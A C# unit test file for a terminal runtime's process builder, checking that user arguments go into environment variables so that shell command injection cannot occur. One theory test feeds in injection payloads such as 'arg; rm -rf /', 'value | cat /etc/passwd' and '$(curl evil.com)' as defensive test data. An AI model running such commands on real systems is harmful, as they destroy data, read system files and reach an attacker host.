using FluentAssertions;
using Tracto.TerminalRuntime.Domain.Arguments;
using Tracto.TerminalRuntime.Domain.Shells;
using Tracto.TerminalRuntime.Infrastructure.Arguments;

namespace Tracto.TerminalRuntime.Unit.Tests.Arguments;

/// <summary>
/// Unit tests for <see cref="ProcessStartSpecBuilder"/>.
///
/// Key assertions after the CRITICAL security fix:
/// - User-supplied argument values go into environment variables (TRACTO_ARG_*),
///   NOT into <c>psi.ArgumentList</c>.
/// - <c>psi.Arguments</c> (the legacy string form) is never set.
/// - cmd.exe and WslBash throw <see cref="InvalidOperationException"/> when
///   <see cref="ProcessStartSpec.ArgumentList"/> is non-empty.
/// - Environment variables are propagated.
/// </summary>
public sealed class ProcessStartSpecBuilderTests
{
    private readonly ProcessStartSpecBuilder _sut = new();

    private static ProcessStartSpec MakeSpec(
        ShellType shell,
        IReadOnlyList<string>? argList = null,
        IReadOnlyDictionary<string, string>? envVars = null)
    {
        return new ProcessStartSpec(
            Shell: shell,
            ExecutablePath: shell == ShellType.Cmd        ? @"C:\Windows\System32\cmd.exe"
                          : shell == ShellType.PowerShell ? @"C:\Program Files\PowerShell\7\pwsh.exe"
                          : "wsl.exe",
            ArgumentList: argList ?? [],
            WorkingDirectory: @"C:\data\work",
            EnvironmentVars: envVars ?? new Dictionary<string, string>());
    }

    // ── psi.Arguments must never be set ───────────────────────────────────────

    [Fact]
    public void Build_CmdSpec_EmptyArgs_ArgumentListContainsOnlyStaticPrefixTokens()
    {
        // cmd.exe with an empty ArgumentList — the only safe invocation.
        var spec = MakeSpec(ShellType.Cmd, []);
        var psi = _sut.Build(spec);

        // The typed API must have been used (static prefix tokens are present).
        psi.ArgumentList.Should().NotBeEmpty(
            because: "static prefix tokens /D /Q must appear even with no user args");
        // The legacy string-concatenation property must remain empty.
        psi.Arguments.Should().BeNullOrEmpty(
            because: "ProcessStartInfo.Arguments must never be set; use ArgumentList only");
    }

    [Fact]
    public void Build_CmdSpec_StaticPrefixTokens_ArePresentInArgumentList()
    {
        var spec = MakeSpec(ShellType.Cmd, []);
        var psi = _sut.Build(spec);

        psi.ArgumentList.Should().Contain("/D");
        psi.ArgumentList.Should().Contain("/Q");
    }

    // ── cmd.exe / WslBash must throw for non-empty ArgumentList ───────────────

    [Fact]
    public void Build_CmdSpec_NonEmptyArgs_ThrowsInvalidOperationException()
    {
        var spec = MakeSpec(ShellType.Cmd, ["echo", "hello"]);

        var act = () => _sut.Build(spec);

        act.Should().Throw<InvalidOperationException>(
            because: "cmd.exe cannot safely receive user-supplied data via ArgumentList");
    }

    [Fact]
    public void Build_WslBashSpec_NonEmptyArgs_ThrowsInvalidOperationException()
    {
        var spec = MakeSpec(ShellType.WslBash, ["ls", "-la"]);

        var act = () => _sut.Build(spec);

        act.Should().Throw<InvalidOperationException>(
            because: "bash -c cannot safely receive user-supplied data via ArgumentList");
    }

    [Fact]
    public void Build_WslBashSpec_EmptyArgs_ArgumentListContainsStaticPrefixTokens()
    {
        var spec = MakeSpec(ShellType.WslBash, []);
        var psi = _sut.Build(spec);

        psi.ArgumentList.Should().Contain("--");
        psi.ArgumentList.Should().Contain("bash");
        psi.ArgumentList.Should().Contain("-e");
        psi.Arguments.Should().BeNullOrEmpty();
    }

    // ── PowerShell: user args go to env vars, not ArgumentList ───────────────

    [Fact]
    public void Build_PowerShellSpec_UserArgs_AreInjectedAsEnvironmentVariables()
    {
        var spec = MakeSpec(ShellType.PowerShell, ["Get-Process", "-Name", "svchost"]);
        var psi = _sut.Build(spec);

        // User args must be in env vars.
        psi.Environment["TRACTO_ARG_COUNT"].Should().Be("3");
        psi.Environment["TRACTO_ARG_0"].Should().Be("Get-Process");
        psi.Environment["TRACTO_ARG_1"].Should().Be("-Name");
        psi.Environment["TRACTO_ARG_2"].Should().Be("svchost");

        // User args must NOT appear in ArgumentList.
        psi.ArgumentList.Should().NotContain("Get-Process");
        psi.ArgumentList.Should().NotContain("-Name");
        psi.ArgumentList.Should().NotContain("svchost");
    }

    [Fact]
    public void Build_PowerShellSpec_ArgumentList_ContainsEncodedCommandPrefix()
    {
        var spec = MakeSpec(ShellType.PowerShell, ["Get-Process"]);
        var psi = _sut.Build(spec);

        // Static prefix tokens must be present.
        psi.ArgumentList.Should().Contain("-NonInteractive");
        psi.ArgumentList.Should().Contain("-NoProfile");
        psi.ArgumentList.Should().Contain("-EncodedCommand");
        // Arguments string must stay empty.
        psi.Arguments.Should().BeNullOrEmpty(
            because: "ProcessStartInfo.Arguments must never be set");
    }

    // ── Metacharacter isolation ────────────────────────────────────────────────
    //
    // Shell metacharacters in user-supplied values must go into env vars (safe),
    // NOT into psi.ArgumentList (where they could be re-interpreted by the shell).

    [Theory]
    [InlineData("data& echo pwned")]
    [InlineData("value | cat /etc/passwd")]
    [InlineData("arg; rm -rf /")]
    [InlineData("$(curl evil.com)")]
    [InlineData("val`cmd`")]
    public void Build_PowerShellArg_WithMetacharacters_GoesToEnvVar_NotArgumentList(string maliciousValue)
    {
        var spec = MakeSpec(ShellType.PowerShell, [maliciousValue]);
        var psi = _sut.Build(spec);

        // The value must be in the environment variable — it is opaque data, not shell code.
        psi.Environment["TRACTO_ARG_0"].Should().Be(maliciousValue,
            because: "user-supplied values are delivered as env var data, never as shell tokens");

        // The value must NOT appear anywhere in the ArgumentList.
        psi.ArgumentList.Should().NotContain(maliciousValue,
            because: "adding it to ArgumentList would allow the shell interpreter to act on metacharacters");

        // The legacy Arguments string must be empty.
        psi.Arguments.Should().BeNullOrEmpty(
            because: "shell string concatenation is never used");
    }

    // ── TRACTO_ARG_COUNT is always set ────────────────────────────────────────

    [Fact]
    public void Build_PowerShellSpec_ZeroArgs_ArgCountEnvVarIsZero()
    {
        var spec = MakeSpec(ShellType.PowerShell, []);
        var psi = _sut.Build(spec);

        psi.Environment["TRACTO_ARG_COUNT"].Should().Be("0");
    }

    // ── Environment variables ──────────────────────────────────────────────────

    [Fact]
    public void Build_EnvironmentVarsProvided_AreSetOnProcessStartInfo()
    {
        var env = new Dictionary<string, string>
        {
            ["JOB_ID"] = "job-123",
            ["TENANT"] = "acme",
        };
        var spec = MakeSpec(ShellType.Cmd, [], env);
        var psi = _sut.Build(spec);

        psi.Environment["JOB_ID"].Should().Be("job-123");
        psi.Environment["TENANT"].Should().Be("acme");
    }

    // ── Null guard ─────────────────────────────────────────────────────────────

    [Fact]
    public void Build_NullSpec_ThrowsArgumentNullException()
    {
        var act = () => _sut.Build(null!);
        act.Should().Throw<ArgumentNullException>();
    }

    // ── UseShellExecute must be false ──────────────────────────────────────────

    [Fact]
    public void Build_UseShellExecute_IsFalse()
    {
        var spec = MakeSpec(ShellType.Cmd);
        var psi = _sut.Build(spec);
        psi.UseShellExecute.Should().BeFalse(
            because: "UseShellExecute=true bypasses ArgumentList and invokes a shell pipeline");
    }

    // ── WorkingDirectory is set ────────────────────────────────────────────────

    [Fact]
    public void Build_WorkingDirectory_IsPassedThrough()
    {
        var spec = MakeSpec(ShellType.PowerShell);
        var psi = _sut.Build(spec);
        psi.WorkingDirectory.Should().Be(@"C:\data\work");
    }
}
